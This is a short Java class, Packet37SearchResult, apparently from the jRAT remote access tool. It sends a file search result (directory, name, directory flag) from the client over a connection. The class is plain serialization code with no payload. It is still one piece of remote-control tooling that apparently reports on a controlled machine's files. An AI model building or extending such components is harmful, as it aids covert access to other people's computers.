package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.outgoing.AbstractOutgoingPacket;


public class Packet37SearchResult extends AbstractOutgoingPacket {

	private String dir;
	private String name;
	private boolean directory;

	public Packet37SearchResult(String dir, String name, boolean directory) {
		this.dir = dir;
		this.name = name;
		this.directory = directory;
	}

	@Override
	public void write(Connection con) throws Exception {
        con.writeLine(dir);
        con.writeLine(name);
        con.writeBoolean(directory);
	}

	@Override
	public short getPacketId() {
		return 37;
	}

}
